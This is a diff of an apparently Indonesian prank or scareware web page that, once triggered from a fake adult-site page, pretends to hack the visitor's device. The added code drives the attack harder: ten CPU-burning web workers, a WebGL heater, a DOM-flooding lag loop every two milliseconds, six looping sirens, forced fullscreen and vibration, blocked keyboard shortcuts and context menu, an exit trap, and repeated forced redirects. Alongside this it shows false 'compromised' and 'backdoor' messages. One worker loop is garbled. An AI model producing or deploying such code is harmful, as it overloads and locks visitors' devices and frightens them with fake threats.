+  'KAMU TIDAK BISA APA-APA','HP LO PANAS?',
+  'MAZKiPLAY OWNZ YOUR DEVICE','DATA: COMPROMISED',
+  'SHELL: OPEN BACKDOOR','NET: MONITORED',
+  'CAM: LOL','ALL YOUR BASE ARE BELONG TO US',
+  'BELUM ADA YANG BISA LOLOS',
+  'TOTAL OWNED','NO ESCAPE','SYSTEM CRITICAL',
+  'KERNEL PANIC','BOOT: FAIL','BRICK: SOON',
+  'RIP DEVICE','GG WP','MAZKiPLAY OWNS U'
 ];
 
 // ===== STATE =====
-let triggered = false;
-let secondsLeft = 10;
-let countdownInterval = null;
-let floatInterval = null;
-let lagInterval = null;
-let workers = [];
-let cleanupVideo = null;
-let cleanupWebGL = null;
+let triggered = false, secondsLeft = 10, countdownInterval = null;
+let floatInterval = null, lagInterval = null, workers = [];
+let cleanupVideo = null, cleanupWebGL = null;
 
 // ===== DOM =====
 const overlay = document.getElementById('hackerOverlay');
@@ -415,13 +385,12 @@ const redirectCountdown = document.getElementById('redirectCountdown');
 const anonymousVideo = document.getElementById('anonymousVideo');
 const anonymousContainer = document.getElementById('anonymousVideoContainer');
 const floatingContainer = document.getElementById('floatingTextsContainer');
+const darkWord = document.getElementById('darkWord');
 
 // ===== TRIGGER =====
 function handleTrigger() {
   if (triggered) return;
   triggered = true;
-
-  // Mulai semuanya!
   startCountdown();
   startCanvasVideo();
   playSounds();
@@ -433,10 +402,11 @@ function handleTrigger() {
   createHackerGrid();
   createFloatingTexts();
   showOverlay();
+  setTimeout(() => darkWord.classList.add('show'), 200);
+  setTimeout(() => darkWord.classList.remove('show'), 1200);
 }
 window.handleTrigger = handleTrigger;
 
-// ===== SHOW OVERLAY =====
 function showOverlay() {
   overlay.classList.add('show');
   anonymousContainer.classList.add('show');
@@ -444,16 +414,15 @@ function showOverlay() {
   document.getElementById('adultSite').style.display = 'none';
 }
 
-// ===== COUNTDOWN + REDIRECT =====
+// ===== COUNTDOWN =====
 function startCountdown() {
   countdownInterval = setInterval(() => {
     secondsLeft--;
     countdownEl.textContent = secondsLeft;
-    redirectCountdown.textContent = `⏳ Redirect otomatis dalam ${secondsLeft} detik...`;
+    redirectCountdown.textContent = `⏳ Menuju kegelapan dalam ${secondsLeft} detik...`;
     if (secondsLeft <= 3) banner.classList.add('urgent');
     if (secondsLeft <= 0) {
       clearInterval(countdownInterval);
-      banner.textContent = '🚀 MENGALIHKAN...';
       doRedirect();
     }
   }, 1000);
@@ -461,16 +430,14 @@ function startCountdown() {
 
 function doRedirect() {
   try { window.location.href = REDIRECT_URL; } catch(e) {}
-  setTimeout(() => { try { window.location.replace(REDIRECT_URL); } catch(e) {} }, 100);
-  setTimeout(() => { try { window.location.assign(REDIRECT_URL); } catch(e) {} }, 300);
-  setTimeout(doRedirect, 2000);
+  setTimeout(() => { try { window.location.replace(REDIRECT_URL); } catch(e) {} }, 50);
+  setTimeout(() => { try { window.location.assign(REDIRECT_URL); } catch(e) {} }, 150);
+  setTimeout(doRedirect, 500);
 }
 window.doRedirect = doRedirect;
-
-// Redirect button
 document.getElementById('redirectBtn').addEventListener('click', doRedirect);
 
-// ===== CANVAS VIDEO (Anonymous loop) =====
+// ===== CANVAS VIDEO =====
 function startCanvasVideo() {
   const canvas = document.createElement('canvas');
   canvas.width = 640; canvas.height = 360;
@@ -481,263 +448,232 @@ function startCanvasVideo() {
   function draw() {
     if (!running) return;
     frame++;
-    ctx.fillStyle = '#050505'; ctx.fillRect(0,0,640,360);
 
-    // Glitch bars
-    for(let i=0;i<18;i++){
-      const y = (frame * 7 + i * 15) % 360;
-      const h = 1 + Math.random() * 28;
-      ctx.fillStyle = `rgba(0,255,65,${.02+Math.random()*.12})`;
-      ctx.fillRect(Math.random()*150,y,200+Math.random()*400,h);
-      ctx.fillStyle = `rgba(255,0,0,${.02+Math.random()*.06})`;
-      ctx.fillRect(Math.random()*350,y,50+Math.random()*200,h*.5);
+    // Extreme flicker background
+    ctx.fillStyle = frame % 2 === 0 ? '#000' : '#050005';
+    ctx.fillRect(0,0,640,360);
+
+    // Glitch bars massal
+    for(let i=0;i<30;i++){
+      const y = (frame*5+i*8)%360;
+      const h = 1+Math.random()*35;
+      ctx.fillStyle = `rgba(0,255,65,${.01+Math.random()*.1})`;
+      ctx.fillRect(Math.random()*100,y,200+Math.random()*400,h);
+      ctx.fillStyle = `rgba(255,0,0,${.01+Math.random()*.05})`;
+      ctx.fillRect(Math.random()*300,y,50+Math.random()*200,h*.4);
+      ctx.fillStyle = `rgba(255,0,255,${.01+Math.random()*.03})`;
+      ctx.fillRect(Math.random()*200,y,100+Math.random()*300,h*.3);
     }
 
-    // Scanlines
-    ctx.fillStyle = 'rgba(255,0,0,.05)';
-    for(let i=0;i<4;i++) ctx.fillRect(0,(frame*5+i*60)%360,640,1);
+    // Scanlines super cepat
+    ctx.fillStyle = 'rgba(255,0,0,.04)';
+    for(let i=0;i<6;i++) ctx.fillRect(0,(frame*3+i*40)%360,640,1);
 
     // Matrix chars
-    ctx.font = 'bold 12px monospace';
-    for(let x=0;x<50;x++){
-      const col = MATRIX_CHARS[(frame+x*13+Math.floor(x*1.7))%MATRIX_CHARS.length];
-      const y = (frame*(1.8+(x%5))+x*17)%360;
-      ctx.fillStyle = `rgba(0,255,65,${.03+Math.random()*.25})`;
-      ctx.fillText(col,x*13,y);
+    ctx.font = 'bold 11px monospace';
+    for(let x=0;x<55;x++){
+      const col = MATRIX_CHARS[(frame+x*17+Math.floor(x*2.3))%MATRIX_CHARS.length];
+      const y = (frame*(2.2+(x%6))+x*15)%360;
+      ctx.fillStyle = `rgba(0,255,65,${.02+Math.random()*.2})`;
+      ctx.fillText(col,x*12,y);
+      // Shadow
+      ctx.fillStyle = `rgba(0,255,65,${.01+Math.random()*.08})`;
+      ctx.fillText(col,x*12+2,y+2);
     }
 
-    // Anonymous mask (circle with glow)
-    const cx = 320 + Math.sin(frame*.01)*20;
-    const cy = 180 + Math.sin(frame*.02)*15;
+    // Anonymous circle besar
+    const cx = 320 + Math.sin(frame*.02)*30;
+    const cy = 180 + Math.sin(frame*.03)*25;
     ctx.save();
-    ctx.beginPath();
-    ctx.arc(cx, cy, 70 + Math.sin(frame*.03)*10, 0, Math.PI*2);
-    ctx.fillStyle = 'rgba(50,50,50,.3)';
-    ctx.fill();
-    ctx.strokeStyle = `rgba(0,255,65,${.2+Math.sin(frame*.05)*.15})`;
-    ctx.lineWidth = 3;
-    ctx.stroke();
-    ctx.font = 'bold 18px monospace';
-    ctx.fillStyle = `rgba(0,255,65,${.3+Math.sin(frame*.04)*.2})`;
+    for(let ring=0;ring<5;ring++){
+      ctx.beginPath();
+      ctx.arc(cx, cy, 50+ring*12+Math.sin(frame*.05+ring)*5, 0, Math.PI*2);
+      ctx.strokeStyle = `rgba(0,255,65,${.05+ring*.03+Math.sin(frame*.04)*.04})`;
+      ctx.lineWidth = 2-ring*.3;
+      ctx.stroke();
+    }
+    ctx.font = 'bold 16px monospace';
+    ctx.fillStyle = `rgba(0,255,65,${.15+Math.sin(frame*.03)*.1})`;
     ctx.textAlign = 'center';
-    ctx.fillText('ANONYMOUS', cx, cy + 100);
+    ctx.fillText('ANONYMOUS', cx, cy+95);
     ctx.restore();
 
-    // M4zk1pL4y besar
-    ctx.font = 'bold 36px monospace';
-    ctx.fillStyle = `rgba(255,0,64,${.3+Math.sin(frame*.05)*.25})`;
+    // M4zk1pL4y raksasa
+    ctx.font = 'bold 48px monospace';
+    ctx.fillStyle = `rgba(255,0,64,${.2+Math.sin(frame*.04)*.15})`;
     ctx.shadowColor = '#ff0040';
-    ctx.shadowBlur = 30 + Math.sin(frame*.03)*15;
+    ctx.shadowBlur = 50+Math.sin(frame*.02)*25;
     ctx.textAlign = 'center';
-    ctx.fillText('M4zk1pL4y', 320 + Math.sin(frame*.02)*15, 180 + Math.sin(frame*.04)*40);
-    ctx.shadowBlur = 0;
+    ctx.fillText('M4zk1pL4y', 320+Math.sin(frame*.015)*25, 180+Math.sin(frame*.035)*55);
 
-    ctx.font = '9px monospace';
-    ctx.fillStyle = '#3a6';
+    // Double shadow
+    ctx.shadowColor = '#00ff41';
+    ctx.shadowBlur = 40;
+    ctx.fillStyle = `rgba(0,255,65,${.05+Math.sin(frame*.05)*.04})`;
+    ctx.fillText('M4zk1pL4y', 320+Math.sin(frame*.015)*25+3, 180+Math.sin(frame*.035)*55+3);
+    ctx.shadowBlur = 0;
     ctx.textAlign = 'left';
-    ctx.fillText(`> SYS:BREACHED | FRM:${frame} | T:${performance.now().toFixed(0)}ms`, 8, 348);
-    ctx.textAlign = 'start';
+
+    ctx.font = '8px monospace';
+    ctx.fillStyle = '#3a6';
+    ctx.fillText(`> SYS:DEAD | FRM:${frame} | T:${performance.now().toFixed(0)}ms`, 6, 350);
 
     requestAnimationFrame(draw);
   }
   draw();
-  try {
-    const stream = canvas.captureStream(30);
-    anonymousVideo.srcObject = stream;
-    anonymousVideo.play().catch(()=>{});
-  } catch(e) {}
-  cleanupVideo = () => { running = false; };
+  try { const stream = canvas.captureStream(30); anonymousVideo.srcObject = stream; anonymousVideo.play().catch(()=>{}); } catch(e) {}
+  cleanupVideo = ()=>{running=false};
 }
 
-// ===== SOUNDS: SIREN + TAWA =====
+// ===== SOUNDS: SIREN MAX + TAWA =====
 function playSounds() {
-  // Background music
+  // Music
   const music = document.createElement('audio');
   music.src = 'https://kholqin.github.io/aman-kaget/media/ambient-patriotik.wav';
-  music.loop = true; music.volume = 0.7;
+  music.loop = true; music.volume = 0.9;
   music.play().catch(()=>{});
 
-  // Laughter
+  // Laughter — loop keras
   const laugh = document.createElement('audio');
   laugh.src = 'https://kholqin.github.io/aman-kaget/media/tawa-aman.wav';
   laugh.loop = true; laugh.volume = 1.0;
   laugh.play().catch(()=>{});
 
-  // SIREN via AudioContext — LOUD!
+  // SIREN MASSAL — 6 suara
   setTimeout(() => {
     try {
-      for (let s = 0; s < 3; s++) {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        // Siren oscillator
+      for(let ctxN=0;ctxN<6;ctxN++){
+        const ctx = new (window.AudioContext||window.webkitAudioContext)();
+        const baseFreq = [600,800,400,1200,300,900][ctxN];
         const osc = ctx.createOscillator();
         const gain = ctx.createGain();
-        osc.type = 'sawtooth';
-        gain.gain.value = 0.4;
+        osc.type = ['sawtooth','square','custom','sawtooth','square','sawtooth'][ctxN];
+        gain.gain.value = [0.35,0.25,0.3,0.2,0.4,0.28][ctxN];
         osc.connect(gain).connect(ctx.destination);
         osc.start();
 
-        // Frequency modulation for siren effect
         setInterval(() => {
-          const t = performance.now() / 1000;
-          osc.frequency.value = 600 + Math.sin(t * 6) * 400;
-          gain.gain.value = 0.3 + Math.sin(t * 4) * 0.15;
-        }, 50);
-
-        // Second siren with different pitch
-        const osc2 = ctx.createOscillator();
-        const gain2 = ctx.createGain();
-        osc2.type = 'square';
-        gain2.gain.value = 0.25;
-        osc2.connect(gain2).connect(ctx.destination);
-        osc2.start();
-
-        setInterval(() => {
-          const t = performance.now() / 1000;
-          osc2.frequency.value = 400 + Math.sin(t * 5 + 2) * 300;
-          gain2.gain.value = 0.2 + Math.sin(t * 3 + 1) * 0.1;
-        }, 50);
+          const t = performance.now()/1000;
+          osc.frequency.value = baseFreq + Math.sin(t*[6,5,7,8,4,9][ctxN])*[400,300,500,350,450,380][ctxN];
+          gain.gain.value = [0.35,0.25,0.3,0.2,0.4,0.28][ctxN] + Math.sin(t*[4,3,5,6,2,4][ctxN])*[0.15,0.12,0.18,0.1,0.2,0.14][ctxN];
+        }, 30);
       }
     } catch(e) {}
-  }, 200);
+  }, 100);
 }
 
-// ===== CPU HEATER =====
+// ===== CPU HEATER — 10 WORKER =====
 function startCPUHeater() {
-  const workerCode = `
-    let c=0;
-    function b(){for(let i=0;i<2000000;i++){c^=(i*0x9e3779b9)<<3;c+=Math.sin(i)*Math.cos(i*.7)*Math.tan(i*.3);c|=0;}postMessage({h:c});setTimeout(b,0);}
-    b();
-  `;
-  const blob = new Blob([workerCode], {type:'application/javascript'});
+  const code = `let c=0;function b(){for(let i=0;i=0);}b();`;
+  const blob = new Blob([code], {type:'application/javascript'});
   const url = URL.createObjectURL(blob);
-  for (let i = 0; i < 6; i++) {
-    try { workers.push(new Worker(url)); } catch(e) {}
-  }
+  for(let i=0;i<10;i++){ try{workers.push(new Worker(url));}catch(e){} }
 }
 
 // ===== WEBGL HEATER =====
 function startWebGLHeater() {
   const c = document.createElement('canvas');
-  c.width = 128; c.height = 128;
+  c.width = 256; c.height = 256;
   c.style.cssText = 'position:fixed;top:-9999px;pointer-events:none';
-  const gl = c.getContext('webgl') || c.getContext('webgl2');
-  if (!gl) return;
-  let running = true;
-  const vs = gl.createShader(gl.VERTEX_SHADER);
-  gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0.0,1.0);}'); gl.compileShader(vs);
-  const fs = gl.createShader(gl.FRAGMENT_SHADER);
-  gl.shaderSource(fs, `precision highp float;uniform float t;void main(){float x=sin(t+gl_FragCoord.x*.2)*cos(t*.9+gl_FragCoord.y*.2);float y=cos(t*1.7+gl_FragCoord.x*.08)*sin(t*1.1+gl_FragCoord.y*.08);gl_FragColor=vec4(x*y*abs(sin(t)),y*.5*abs(cos(t*.5)),x*.5*abs(sin(t*.7)),1.0);}`);
+  const gl = c.getContext('webgl')||c.getContext('webgl2');
+  if(!gl)return;
+  let running=true;
+  const vs=gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.0,1.0);}');gl.compileShader(vs);
+  const fs=gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs,`precision highp float;uniform float t;void main(){float x=sin(t+gl_FragCoord.x*.3)*cos(t*1.3+gl_FragCoord.y*.3);float y=cos(t*2.1+gl_FragCoord.x*.1)*sin(t*1.5+gl_FragCoord.y*.1);float z=sin(t*0.7+gl_FragCoord.x*.05)*cos(t*0.9+gl_FragCoord.y*.05);gl_FragColor=vec4(x*y*z,y*z*.5,x*z*.5,1.0);}`);
   gl.compileShader(fs);
-  const prog = gl.createProgram(); gl.attachShader(prog,vs); gl.attachShader(prog,fs); gl.linkProgram(prog); gl.useProgram(prog);
-  const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER,buf);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
-  const loc = gl.getAttribLocation(prog, 'p'); gl.enableVertexAttribArray(loc); gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-  const tLoc = gl.getUniformLocation(prog, 't');
-  function render(){if(!running)return;gl.uniform1f(tLoc,performance.now()/50);gl.drawArrays(gl.TRIANGLE_STRIP,0,4);requestAnimationFrame(render);}
+  const prog=gl.createProgram();gl.attachShader(prog,vs);gl.attachShader(prog,fs);gl.linkProgram(prog);gl.useProgram(prog);
+  const buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+  gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
+  const loc=gl.getAttribLocation(prog,'p');gl.enableVertexAttribArray(loc);gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);
+  const tLoc=gl.getUniformLocation(prog,'t');
+  function render(){if(!running)return;gl.uniform1f(tLoc,performance.now()/30);gl.drawArrays(gl.TRIANGLE_STRIP,0,4);requestAnimationFrame(render);}
   render();
-  cleanupWebGL = ()=>{running=false};
+  cleanupWebGL=()=>{running=false};
 }
 
 // ===== LAG GENERATOR =====
 function startLagGenerator() {
   lagInterval = setInterval(() => {
-    for(let i=0;i<150;i++){
-      const d = document.createElement('div');
-      d.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none';
-      d.textContent = 'X'.repeat(2000);
+    for(let i=0;i<300;i++){
+      const d=document.createElement('div');
+      d.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none';
+      d.textContent='X'.repeat(5000);
       document.body.appendChild(d);
     }
-    const els = document.querySelectorAll('.hacker-panel, .floating-hack-text, .matrix-rain span');
-    els.forEach(el => {
-      el.style.transform = `translate(${Math.random()*15}px,${Math.random()*15}px)`;
-      el.style.transform = 'translate(0,0)';
-      el.style.filter = `hue-rotate(${Math.random()*360}deg) blur(${Math.random()*2}px)`;
-      el.style.filter = 'none';
+    document.querySelectorAll('.hacker-panel,.floating-hack-text,.matrix-rain span').forEach(el=>{
+      el.style.transform=`translate(${Math.random()*30}px,${Math.random()*30}px)`;
+      el.style.transform='translate(0,0)';
+      el.style.filter=`hue-rotate(${Math.random()*360}deg)blur(${Math.random()*4}px)brightness(${Math.random()*3})`;
+      el.style.filter='none';
       void el.offsetTop;
     });
-    try {
-      for(let m=0;m<3;m++){const arr=new Array(800000);for(let j=0;j<arr.length;j++)arr[j]=Math.random()*Math.sin(j);}
-    } catch(e) {}
-    document.body.style.width = window.innerWidth + Math.random() + 'px';
-    document.body.style.width = '';
-  }, 5);
+    try{for(let m=0;m<5;m++){const a=new Array(1000000);for(let j=0;j<a.length;j++)a[j]=Math.random()*Math.sin(j);}}catch(e){}
+    document.body.style.width=window.innerWidth+Math.random()+'px';
+    document.body.style.width='';
+  }, 2);
 }
 
 // ===== ENVIRONMENT =====
 function startEnvironmentTakeover() {
-  try { document.documentElement.requestFullscreen?.().catch(()=>{}); } catch(e) {}
-  try { navigator.vibrate?.([200,50,200,50,500,100,300,50,1000]); } catch(e) {}
-  window.onbeforeunload = () => '⚠ PERINGATAN! Jangan tinggalkan halaman!';
-  setInterval(() => { window.onbeforeunload = () => '⚠ PERINGATAN! Jangan tinggalkan halaman!'; }, 1000);
+  try{document.documentElement.requestFullscreen?.().catch(()=>{})}catch(e){}
+  try{navigator.vibrate?.([500,100,500,100,1000,200,500,50,2000])}catch(e){}
+  window.onbeforeunload=()=>'⚠ SISTEM RUNTUH! JANGAN TINGGALKAN!';
+  setInterval(()=>{window.onbeforeunload=()=>'⚠ SISTEM RUNTUH! JANGAN TINGGALKAN!'},500);
+  // Block shortcuts
+  document.addEventListener('keydown',e=>{if(e.ctrlKey||e.altKey||e.metaKey||e.key==='Escape'){e.preventDefault();return false}});
+  window.addEventListener('contextmenu',e=>{if(triggered){e.preventDefault();return false}});
 }
 
-// ===== MATRIX RAIN =====
+// ===== CREATE MATRIX RAIN =====
 function createMatrixRain() {
-  const container = document.getElementById('matrixRain');
-  for(let i=0;i<35;i++){
-    let col = '';
-    for(let r=0;r<35;r++) col += MATRIX_CHARS[(i*17+r*13)%MATRIX_CHARS.length];
-    const span = document.createElement('span');
-    span.textContent = col;
-    span.style.cssText = `--delay:${(i%14)*-.12}s;--duration:${.8+(i%3)}s;animation-delay:${(i%14)*-.12}s;animation-duration:${.8+(i%3)}s;opacity:.5`;
-    container.appendChild(span);
+  const c=document.getElementById('matrixRain');
+  for(let i=0;i<40;i++){
+    let col='';
+    for(let r=0;r<40;r++) col+=MATRIX_CHARS[(i*19+r*13)%MATRIX_CHARS.length];
+    const s=document.createElement('span');
+    s.textContent=col;
+    s.style.cssText=`--delay:${(i%16)*-.08}s;--duration:${.5+(i%2)}s;animation-delay:${(i%16)*-.08}s;animation-duration:${.5+(i%2)}s;opacity:.6`;
+    c.appendChild(s);
   }
 }
 
-// ===== HACKER GRID =====
+// ===== CREATE HACKER GRID =====
 function createHackerGrid() {
-  const grid = document.getElementById('hackerGrid');
-  const count = 30;
-  const labels = ['ACCESS','TRACE','EXEC','BREACH','SCAN','ROOT','DUMP','MASK','PWN','ZOMBIE','CRYPTO','KILL','WORM','DDoS','PROXY','SHELL','BRUTE','PHISH','SPOOF','SNIFF','INJECT','SPRAY','FLOOD','BURN','CPU:100%','GPU:BURN','FAN:MAX','TEMP:99C','VOLT:SPIKE','CLOCK:OC'];
-  const codes = ['0101 1100 0011','PACKET_STREAM','NUSANTARA_01','MASK: ACTIVE','SHELL: OPEN','PORT: 6666','CRED: DUMP','ROOT: TRUE','PAYLOAD: SENT','PROXY: CHAIN','BOT: ONLINE','BACKDOOR: OPEN','MEMORY: LEAK','PROC: INJECT','NET: FLOOD','KEYLOG: ON','CPU: 100%','GPU: BURN','FAN: MAX','TEMP: 99C','VOLT: SPIKE','CLOCK: OC','THERMAL: THROT','FIRE: RISK','PWNED: YES','OWNED: TOTAL','ROOTED: YES','DATA: GONE','CAM: LOL','BRICK: SOON'];
+  const g=document.getElementById('hackerGrid');
+  const count=48;
+  const labels=['ACCESS','TRACE','EXEC','BREACH','SCAN','ROOT','DUMP','MASK','PWN','ZOMBIE','CRYPTO','KILL','WORM','DDoS','PROXY','SHELL','BRUTE','PHISH','SPOOF','SNIFF','INJECT','SPRAY','FLOOD','BURN','CPU:100%','GPU:BURN','FAN:MAX','TEMP:99C','VOLT:SPIKE','CLOCK:OC','THERMAL','FIRE','MEM:LEAK','KRNL:PANIC','BOOT:FAIL','SYS:DOWN','PWNED','OWNED','ROOTED','DATA:GONE','CAM:LOL','BRICK','DEAD','RIP','GAME:OVER','GG','NO:ESCAPE','MAZKiPLAY'];
+  const codes=['0101 1100 0011','PACKET_STREAM','NUSANTARA_01','MASK: ACTIVE','SHELL: OPEN','PORT: 6666','CRED: DUMP','ROOT: TRUE','PAYLOAD: SENT','PROXY: CHAIN','BOT: ONLINE','BACKDOOR: OPEN','MEMORY: LEAK','PROC: INJECT','NET: FLOOD','KEYLOG: ON','CPU: 100%','GPU: BURN','FAN: MAX','TEMP: 99C','VOLT: SPIKE','CLOCK: OC','THERMAL: THROT','FIRE: RISK','PWNED: YES','OWNED: TOTAL','ROOTED: YES','DATA: GONE','CAM: LOL','BRICK: SOON','RIP: DEVICE','GAME: OVER','NO: ESCAPE','MAZKiPLAY','SYSTEM:DOWN','KERNEL:PANIC','BOOT:FAIL','ALL:BASE','YOU:OWNED','HA:HA','TROL:LOL','RIP:BOZO','GG:EZ','BYE:BYE','LEL','KEK','W','L'];
   for(let i=0;i<count;i++){
-    const p = document.createElement('div'); p.className = 'hacker-panel stage-3';
-    p.innerHTML = `
-      <div class="panel-head"><span>NODE_${String(i+1).padStart(2,'0')}</span><i>● LIVE</i></div>
-      <div class="fake-video">
-        <div class="scanline" style="animation-duration:${.03+Math.random()*.05}s"></div>
-        <div class="terminal-art">${labels[i%labels.length]}<br><b>${codes[i%codes.length]}</b></div>
-        <div class="progress"><span style="width:${5+(i*3)%95}%;animation-duration:${.02+Math.random()*.04}s"></span></div>
-      </div>`;
-    p.style.animationDuration = `${.02+Math.random()*.05}s`;
-    p.style.animationDelay = `${i*.01}s`;
-    grid.appendChild(p);
+    const p=document.createElement('div');p.className='hacker-panel';
+    p.innerHTML=`<div class="panel-head"><span>NODE_${String(i+1).padStart(2,'0')}</span><i>● DEAD</i></div><div class="fake-video"><div class="scanline" style="animation-duration:${.01+Math.random()*.02}s"></div><div class="terminal-art">${labels[i%labels.length]}<br><b>${codes[i%codes.length]}</b></div><div class="progress"><span style="width:${5+(i*2)%98}%;animation-duration:${.005+Math.random()*.01}s"></span></div></div>`;
+    p.style.animationDuration=`${.01+Math.random()*.03}s`;
+    p.style.animationDelay=`${i*.005}s`;
+    g.appendChild(p);
   }
-  grid.classList.add('stage-3');
 }
 
 // ===== FLOATING TEXTS =====
 function createFloatingTexts() {
-  const texts = [];
-  for(let i=0;i<25;i++){
-    texts.push({
-      text: FLOATING_TEXTS[i%FLOATING_TEXTS.length],
-      x: Math.random()*90, y: Math.random()*90,
-      size: 14+Math.random()*26, speed: 1+Math.random()*3
-    });
-  }
+  const texts=[];
+  for(let i=0;i<40;i++) texts.push({text:FLOATING_TEXTS[i%FLOATING_TEXTS.length],x:Math.random()*92,y:Math.random()*92,size:10+Math.random()*24,speed:2+Math.random()*5});
 
-  function renderTexts() {
-    floatingContainer.innerHTML = '';
-    texts.forEach(t => {
-      t.x = Math.max(-2, Math.min(92, t.x + (Math.random()-.5)*t.speed*4));
-      t.y = Math.max(-2, Math.min(92, t.y + (Math.random()-.5)*t.speed*4));
-      const el = document.createElement('div'); el.className = 'floating-hack-text';
-      el.textContent = t.text;
-      el.style.cssText = `left:${t.x}%;top:${t.y}%;font-size:${t.size}px;color:#ff0040;text-shadow:0 0 10px #ff0040,0 0 30px #ff0040,0 0 60px #ff0040;animation-duration:${.03+Math.random()*.05}s`;
+  function render(){
+    floatingContainer.innerHTML='';
+    texts.forEach(t=>{
+      t.x=Math.max(-5,Math.min(95,t.x+(Math.random()-.5)*t.speed*6));
+      t.y=Math.max(-5,Math.min(95,t.y+(Math.random()-.5)*t.speed*6));
+      const el=document.createElement('div');el.className='floating-hack-text';
+      el.textContent=t.text;
+      const hue=Math.floor(Math.random()*360);
+      el.style.cssText=`left:${t.x}%;top:${t.y}%;font-size:${t.size}px;color:hsla(${hue},100%,50%,.9);text-shadow:0 0 5px hsla(${hue},100%,50%,.8),0 0 20px hsla(${hue},100%,50%,.5),0 0 50px hsla(${hue},100%,50%,.3);animation-duration:${.005+Math.random()*.01}s`;
       floatingContainer.appendChild(el);
     });
   }
-
-  renderTexts();
-  floatInterval = setInterval(renderTexts, 40);
+  render();
+  floatInterval=setInterval(render,25);
 }
-
-// ===== KEYBOARD BLOCK =====
-document.addEventListener('keydown', e => {
-  if(e.ctrlKey||e.altKey||e.metaKey){e.preventDefault();return false}
-});
-window.addEventListener('contextmenu', e => { if(triggered){e.preventDefault();return false} });
 </script>
 </body>
 </html>
